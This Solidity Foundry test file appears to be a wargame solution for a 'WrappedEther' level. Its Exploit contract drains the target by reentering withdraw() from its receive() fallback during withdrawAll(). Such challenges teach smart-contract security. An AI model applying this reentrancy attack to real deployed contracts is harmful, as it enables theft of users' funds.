// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        Exploit exploiter = new Exploit(instance);

        vm.deal(address(exploiter), 0.1 ether);
        vm.prank(address(exploiter));
        exploiter.exploit(0.01 ether, 0.1 ether);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }
}

contract Exploit {
    WrappedEther public target;
    uint256 public withdrawAmount;

    constructor(WrappedEther _target) {
        target = _target;
    }

    function exploit(uint256 _amount, uint256 _deposit) external {
        withdrawAmount = _amount;
        target.deposit{value: _deposit}(address(this));
        target.withdrawAll();
    }

    receive() external payable {
        if (address(target).balance >= withdrawAmount) {
            target.withdraw(withdrawAmount);
        }
    }
}
